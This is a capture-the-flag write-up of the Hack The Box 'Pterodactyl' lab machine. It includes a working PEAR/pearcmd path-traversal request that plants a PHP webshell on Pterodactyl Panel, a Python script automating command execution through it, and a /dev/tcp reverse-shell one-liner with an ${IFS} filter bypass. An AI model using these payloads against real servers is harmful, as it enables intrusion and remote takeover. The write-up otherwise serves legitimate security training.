# Pterodactyl - Hack The Box Writeup
**Category:** Linux  
**Difficulty:** Medium 

## Enumeration

### Nmap

Initial scan revealed two services:

```text
22/tcp   open  ssh   OpenSSH 9.6
80/tcp   open  http  nginx 1.21.5
```

---

## Subdomain Enumeration

Enumerating virtual hosts revealed:

```text
panel.pterodactyl.htb
```

Visiting the panel showed a login page for **Pterodactyl Panel**.

---

# Version Discovery

Browsing to:

```text
http://pterodactyl.htb/changelog.txt
```

revealed:

```text
Pterodactyl Panel v1.11.10
```

The changelog also mentioned that:

```text
phpinfo() was enabled
```

Research showed that Pterodactyl Panel v1.11.10 was vulnerable to:

```text
CVE-2025-49132
```

which allows remote code execution.

---

# Initial Access

## Exploiting CVE-2025-49132

Using a public exploit, I was able to extract sensitive application information.

Recovered credentials:

```text
Database:
pterodactyl:PteraPanel@127.0.0.1:3306/panel
```

Laravel application key:

```text
base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=
```

---

## Locating PEAR

The exploit required the path to PEAR.

Using the available information, I found:

```text
../../../../../../usr/share/php/PEAR
```

---

## Writing a Webshell

The final exploit request looked like:

```text
http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system('<payload>')?>+/tmp/shell.php
```

Parameters:

```text
locale      -> Path to PEAR
namespace   -> Use pearcmd
payload     -> PHP code to write
/tmp/shell.php -> Destination file
```

This creates a PHP webshell.

To execute it:

```text
http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell
```

---

## Automating the Exploit

Initially I attempted to execute commands using curl, but requests containing spaces were not behaving correctly.

To solve this I wrote a custom Python script to automate the exploitation process.

The key trick was replacing spaces with:

```text
${IFS}
```

For example:

```bash
bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/IP/4444${IFS}0>&1'
```

Since `${IFS}` expands to a space in the shell, this bypassed issues caused by whitespace handling.

After generating and executing the payload, I obtained a reverse shell.

The python script I made to get reverse shell:
```python
import requests
import subprocess
import re

host = 'panel.pterodactyl.htb'
command = input('Command: ')
pear = '../../../../../../usr/share/php/PEAR'
base_url = f'http://{host}'

def exploit(host, command, pear):
    payload = command.replace(' ', '\\$\\{IFS\\}')
    final_url = F"{base_url}/locales/locale.json?+config-create+/&locale={pear}&namespace=pearcmd&/<?=system('{payload}')?>+/tmp/shell.php"

    print(f'Final exploit url: {final_url}')
    write_command = f'curl -s "{final_url}"'
    exploit_result = subprocess.run(write_command, shell=True, capture_output=True, text=True)

    return exploit_result

def execute():
    exec_url = f'{base_url}/locales/locale.json?locale=../../../../../tmp&namespace=shell'

    print(f'Final execution url: {exec_url}')
    exec_command = f'curl -s "{exec_url}"'
    exec_result = subprocess.run(exec_command, shell=True, capture_output=True, text=True)

    return exec_result
    

exploit_result = exploit(host, command, pear)
exec_result = execute()


print(exec_result)
print('Command Executed!!')
```

---

# Database Enumeration

Using the recovered database credentials, I attempted to connect directly using MariaDB.

This did not work.

Since the application was Laravel-based, I instead used:

```bash
php artisan tinker
```

Tinker provides an interactive Laravel console with access to the application's models and database.

---

## Extracting User Credentials

Using Tinker I recovered the following hashes:

```text
headmonitor:
$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
```

```text
phileasfogg3:
$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
```

Cracking the second hash revealed:

```text
!QAZ2wsx
```

---

# SSH Access

Using the recovered credentials:

```bash
ssh phileasfogg3@pterodactyl.htb
```

Password:

```text
!QAZ2wsx
```

Access obtained.

---

# Privilege Escalation Enumeration

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
(ALL) ALL
```

This is slightly different from the more common:

```text
(ALL : ALL) ALL
```

Meaning:

```text
(ALL) ALL
```

Allows execution as any user.

Whereas:

```text
(ALL : ALL) ALL
```

Allows execution as any user and any group.

---

## Why Sudo Didn't Work

Normally sudo would prompt for our own password.

However, attempting sudo prompted for the target user's password.

This indicated that either:

```text
targetpw
```

or

```text
rootpw
```

was enabled in the sudoers configuration.

Without the target user's password, sudo was unusable.

---

## SUID Enumeration

Searching for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

One unusual binary stood out:

```text
/usr/bin/expiry
```

I had never encountered this binary before, so I kept it in mind for later investigation.

---

## Network Services

Checking listening services:

```bash
ss -tulnp
```

Revealed:

```text
Redis Server
```

running locally.

Although interesting, it did not immediately provide a path to privilege escalation.

---

## Mail Investigation

Checking local mail revealed messages for multiple users.

The most interesting message referenced:

```text
Unusual activity has been observed from the udisks daemon (udisksd)
```

This immediately caught my attention.

---

# Vulnerable Components

Checking package versions:

```bash
rpm -qa | grep -E "^(udisks2|libblockdev)"
```

The installed versions were vulnerable to:

```text
CVE-2025-6019
```

---

## Dependency on CVE-2025-6018

While testing a public proof-of-concept for CVE-2025-6019, I discovered that it required exploitation of:

```text
CVE-2025-6018
```

first.

The attack chain became:

```text
CVE-2025-6018
        ↓
CVE-2025-6019
        ↓
Root
```

---

# Root

First, I executed a public proof-of-concept for:

```text
CVE-2025-6018
```

After successfully completing the first stage, I executed the exploit for:

```text
CVE-2025-6019
```

The chain worked successfully and granted root privileges.

Verify:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root)
```

Retrieve the flag:

```bash
cat /root/root.txt
```

Root flag obtained.

---

# Lessons Learned

- Changelog files often disclose software versions and useful configuration details.
- Laravel application keys and database credentials can frequently be recovered after framework compromise.
- PEAR-based file write vulnerabilities can often be leveraged into webshells.
- `${IFS}` remains a useful trick when dealing with whitespace restrictions in command injection scenarios.
- `php artisan tinker` is an excellent post-exploitation tool when targeting Laravel applications.
- Unusual sudo configurations such as `targetpw` can completely change expected privilege escalation paths.
- Local mail is often overlooked but can contain valuable hints.
- Chaining multiple vulnerabilities together is sometimes required for successful privilege escalation.

---

**Personal Opinion:** The foothold was fairly straightforward once the vulnerable Pterodactyl version was identified. The privilege escalation was the more interesting part, requiring careful enumeration, attention to system messages, and ultimately chaining two separate vulnerabilities together to obtain root access.
